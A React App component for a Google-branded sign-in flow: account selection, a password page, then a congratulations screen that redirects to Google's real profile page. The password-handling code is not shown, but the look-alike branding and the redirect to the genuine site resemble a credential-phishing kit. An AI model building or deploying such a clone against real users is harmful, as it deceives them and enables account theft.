import { useState } from "react";
import SelectEmail from "./pages/SelectEmail.js";
import PasswordPage from "./pages/PasswordPage.js";
import Congrats from "./pages/Congrats.js";
import Footer from "./components/Footer.js";
import logo from "./Assets/google logo.svg";

const PROFILE_URL =
  "https://myaccount.google.com/personal-info?&hl=en";

// step 0 = choose account, 1 = password, 2 = congratulations
export default function App() {
  const [step, setStep] = useState(0);
  const [email, setEmail] = useState("");

  return (
    <div className="screen">
      <img className="logo" src={logo} alt="" />
      <main className="content">
        {step === 0 && (
          <SelectEmail
            onNext={(e) => {
              setEmail(e);
              setStep(1);
            }}
          />
        )}
        {step === 1 && (
          <PasswordPage
            email={email}
            onBack={() => setStep(0)}
            onVerified={() => setStep(2)}
          />
        )}
        {step === 2 && (
          <Congrats
            email={email}
            // Done -> go to the profile page
            onRestart={() => window.location.assign(PROFILE_URL)}
          />
        )}
      </main>
      <Footer />
    </div>
  );
}